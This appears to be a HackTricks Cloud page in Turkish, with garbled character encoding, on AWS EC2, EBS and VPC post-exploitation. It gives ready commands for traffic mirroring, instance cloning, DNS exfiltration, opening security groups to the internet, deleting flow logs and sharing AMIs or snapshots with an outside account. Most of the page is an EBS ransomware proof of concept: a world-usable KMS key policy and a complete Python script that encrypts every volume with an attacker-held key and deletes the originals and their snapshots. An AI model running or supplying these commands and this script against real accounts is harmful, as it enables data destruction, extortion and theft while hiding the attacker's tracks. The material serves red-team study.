# AWS - EC2, EBS, SSM ve VPC SonrasÄ± SÄ±zma

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## EC2 ve VPC

Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **KÃ¶tÃ¼ AmaÃ§lÄ± VPC Aynalama -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC trafik aynalama, VPC iÃ§indeki EC2 Ã¶rnekleri iÃ§in gelen ve giden trafiÄŸi **Ã¶rneklere herhangi bir ÅŸey yÃ¼klemeye gerek kalmadan Ã§oÄŸaltÄ±r**. Bu Ã§oÄŸaltÄ±lmÄ±ÅŸ trafik genellikle analiz ve izleme iÃ§in bir aÄŸ sÄ±zma tespit sistemi (IDS) gibi bir ÅŸeye gÃ¶nderilir.\
Bir saldÄ±rgan, tÃ¼m trafiÄŸi yakalamak ve hassas bilgileri elde etmek iÃ§in bunu kÃ¶tÃ¼ye kullanabilir:

Daha fazla bilgi iÃ§in bu sayfayÄ± kontrol edin:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Ã‡alÄ±ÅŸan Ã–rneÄŸi Kopyala

Ã–rnekler genellikle bazÄ± hassas bilgiler iÃ§erir. Ä°Ã§eri girmenin farklÄ± yollarÄ± vardÄ±r (kontrol edin [EC2 ayrÄ±calÄ±k yÃ¼kseltme hileleri](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)). Bununla birlikte, iÃ§erdiÄŸi bilgileri kontrol etmenin baÅŸka bir yolu, bir AMI oluÅŸturmak ve ondan yeni bir Ã¶rnek Ã§alÄ±ÅŸtÄ±rmaktÄ±r (kendi hesabÄ±nÄ±zda bile):
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshotlar, genellikle hassas bilgileri iÃ§eren birimlerin yedeklemeleridir**, bu nedenle bunlarÄ± kontrol etmek bu bilgileri ortaya Ã§Ä±karabilir.\
EÄŸer bir **snapshot olmayan bir birim bulursanÄ±z**, aÅŸaÄŸÄ±daki iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in bir snapshot oluÅŸturabilir veya sadece hesap iÃ§indeki bir Ã¶rnekte **bu birimi baÄŸlayabilirsiniz**:

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Veri SÄ±zdÄ±rma

#### DNS ile SÄ±zdÄ±rma

Bir EC2'yi trafiÄŸin dÄ±ÅŸarÄ± Ã§Ä±kmasÄ±nÄ± engelleyerek kilitleseniz bile, hala **DNS Ã¼zerinden sÄ±zdÄ±rma yapabilir**.

* **VPC AkÄ±ÅŸ GÃ¼nlÃ¼kleri bunu kaydetmeyecektir**.
* AWS DNS gÃ¼nlÃ¼klerine eriÅŸiminiz yoktur.
*   Bunun devre dÄ±ÅŸÄ± bÄ±rakmak iÃ§in "enableDnsSupport" deÄŸerini false olarak ayarlayÄ±n:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API Ã§aÄŸrÄ±larÄ± ile SÄ±zdÄ±rma

Bir saldÄ±rgan, kendisi tarafÄ±ndan kontrol edilen bir hesabÄ±n API uÃ§ noktalarÄ±nÄ± Ã§aÄŸÄ±rabilir. Cloudtrail bu Ã§aÄŸrÄ±larÄ± kaydedecek ve saldÄ±rgan, sÄ±zdÄ±rÄ±lan verileri Cloudtrail gÃ¼nlÃ¼klerinde gÃ¶rebilecektir.

### AÃ§Ä±k GÃ¼venlik Grubu

Bu ÅŸekilde portlarÄ± aÃ§arak aÄŸ hizmetlerine daha fazla eriÅŸim elde edebilirsiniz:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### ECS'ye Privesc

Bir EC2 Ã¶rneÄŸini Ã§alÄ±ÅŸtÄ±rÄ±p, ECS Ã¶rneklerini Ã§alÄ±ÅŸtÄ±rmak iÃ§in kaydetmek ve ardÄ±ndan ECS Ã¶rneklerinin verilerini Ã§almak mÃ¼mkÃ¼ndÃ¼r.

[**Daha fazla bilgi iÃ§in burayÄ± kontrol edin**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### VPC akÄ±ÅŸ gÃ¼nlÃ¼klerini kaldÄ±rma
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### AMI PaylaÅŸÄ±mÄ±

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Snapshot PaylaÅŸma

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

Bir S3 son-exploitasyon notlarÄ±ndaki Ransomware gÃ¶sterimiyle benzer bir kanÄ±t sunumu. KMS, Ã§eÅŸitli AWS hizmetlerini ÅŸifrelemek iÃ§in ne kadar kolay kullanÄ±labileceÄŸini gÃ¶sterdiÄŸi iÃ§in Ransomware YÃ¶netim Hizmeti iÃ§in RMS olarak yeniden adlandÄ±rÄ±lmalÄ±dÄ±r.

Ä°lk olarak, bir 'saldÄ±rgan' AWS hesabÄ±ndan, KMS'de bir mÃ¼ÅŸteri tarafÄ±ndan yÃ¶netilen anahtar oluÅŸturun. Bu Ã¶rnekte, AWS'nin anahtar verilerini benim iÃ§in yÃ¶netmesine izin vereceÄŸiz, ancak gerÃ§ek bir senaryoda kÃ¶tÃ¼ niyetli bir aktÃ¶r, anahtar verilerini AWS'nin kontrolÃ¼ dÄ±ÅŸÄ±nda tutacaktÄ±r. Anahtar politikasÄ±nÄ±, herhangi bir AWS hesabÄ±nÄ±n AnahtarÄ± kullanmasÄ±na izin vermek iÃ§in deÄŸiÅŸtirin. Bu anahtar politikasÄ± iÃ§in hesabÄ±n adÄ± 'AttackSim' idi ve tÃ¼m eriÅŸime izin veren politika kuralÄ± 'DÄ±ÅŸ Åifreleme' olarak adlandÄ±rÄ±ldÄ±.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Anahtar politika kuralÄ±, bir EBS birimini ÅŸifrelemek iÃ§in kullanÄ±labilmesi iÃ§in aÅŸaÄŸÄ±dakilerin etkinleÅŸtirilmesini gerektirir:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

Åimdi, kullanÄ±labilir hale getirilen genel anahtar ile birlikte, ÅŸifrelenmemiÅŸ EBS birimlerine sahip bazÄ± EC2 Ã¶rnekleri olan bir 'kurban' hesabÄ±nÄ± kullanabiliriz. Bu 'kurban' hesabÄ±nÄ±n EBS birimleri, ÅŸifrelemeye hedef olanlar, bu saldÄ±rÄ±, yÃ¼ksek ayrÄ±calÄ±klÄ± bir AWS hesabÄ±nÄ±n ihlal edildiÄŸi varsayÄ±mÄ± altÄ±nda gerÃ§ekleÅŸtirilir.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 fidye yazÄ±lÄ±mÄ± Ã¶rneÄŸine benzer ÅŸekilde, bu saldÄ±rÄ±, ekli EBS birimlerinin kopyalarÄ±nÄ± anlÄ±k gÃ¶rÃ¼ntÃ¼ler kullanarak oluÅŸturacak, 'saldÄ±rgan' hesabÄ±ndan genel olarak kullanÄ±labilir anahtarÄ± kullanarak yeni EBS birimlerini ÅŸifreleyecek, ardÄ±ndan orijinal EBS birimlerini EC2 Ã¶rneklerinden ayÄ±racak ve silecek ve son olarak, yeni ÅŸifrelenmiÅŸ EBS birimlerini oluÅŸturmak iÃ§in kullanÄ±lan anlÄ±k gÃ¶rÃ¼ntÃ¼leri silecektir. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Bu, hesapta yalnÄ±zca ÅŸifrelenmiÅŸ EBS birimlerinin kullanÄ±labilir olmasÄ±na neden olur.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

AyrÄ±ca, betik, orijinal EBS birimlerini ayÄ±rmak ve silmek iÃ§in EC2 Ã¶rneklerini durdurdu. Orijinal ÅŸifrelenmemiÅŸ birimler artÄ±k mevcut deÄŸil.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Sonraki adÄ±mda, 'saldÄ±rgan' hesaptaki anahtar politikasÄ±na geri dÃ¶nÃ¼n ve anahtar politikasÄ±ndan 'DÄ±ÅŸ Åifreleme' politika kuralÄ±nÄ± kaldÄ±rÄ±n.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Yeni ayarlanan anahtar politikasÄ±nÄ±n yayÄ±lmasÄ± iÃ§in biraz bekleyin. ArdÄ±ndan 'hedef' hesabÄ±na dÃ¶nÃ¼n ve yeni ÅŸifrelenmiÅŸ EBS birimlerinden birini eklemeyi deneyin. Birimi ekleyebileceÄŸinizi gÃ¶receksiniz.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Ancak, ÅŸifrelenmiÅŸ EBS birimiyle EC2 Ã¶rneÄŸini gerÃ§ekten baÅŸlatmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±zda, birim ÅŸifresi kullanÄ±larak ÅŸifrelenemeyeceÄŸi iÃ§in Ã¶rnek sadece 'beklemede' durumundan sÃ¼rekli olarak 'durmuÅŸ' durumuna geÃ§ecektir. Ã‡Ã¼nkÃ¼ anahtar politikasÄ± artÄ±k buna izin vermemektedir.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Bu, kullanÄ±lan Python betiÄŸidir. 'Hedef' hesabÄ±nÄ±n AWS kimlik bilgilerini ve ÅŸifreleme iÃ§in kullanÄ±lacak genel olarak eriÅŸilebilir bir AWS ARN deÄŸerini alÄ±r. Betik, hedeflenen AWS hesabÄ±ndaki TÃœM EC2 Ã¶rneklerine baÄŸlÄ± TÃœM mevcut EBS birimlerinin ÅŸifrelenmiÅŸ kopyalarÄ±nÄ± oluÅŸturacak, ardÄ±ndan her EC2 Ã¶rneÄŸini durduracak, orijinal EBS birimlerini ayÄ±racak, silecek ve iÅŸlem sÄ±rasÄ±nda kullanÄ±lan tÃ¼m anlÄ±k gÃ¶rÃ¼ntÃ¼leri silecektir. Bu, hedeflenen 'hedef' hesabÄ±nda yalnÄ±zca ÅŸifrelenmiÅŸ EBS birimlerini bÄ±rakacaktÄ±r. BU BETÄ°ÄÄ° YALNIZCA BÄ°R TEST ORTAMINDA KULLANIN, YIKICI VE TÃœM ORÄ°JÄ°NAL EBS BÄ°RÄ°MLERÄ°NÄ° SÄ°LECEKTÄ°R. KullanÄ±lan KMS anahtarÄ±nÄ± kullanarak bunlarÄ± kurtarabilir ve anlÄ±k gÃ¶rÃ¼ntÃ¼ler aracÄ±lÄ±ÄŸÄ±yla orijinal durumlarÄ±na geri yÃ¼kleyebilirsiniz, ancak bunun bir fidye yazÄ±lÄ±mÄ± PoC olduÄŸunu unutmamanÄ±zÄ± istiyorum.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
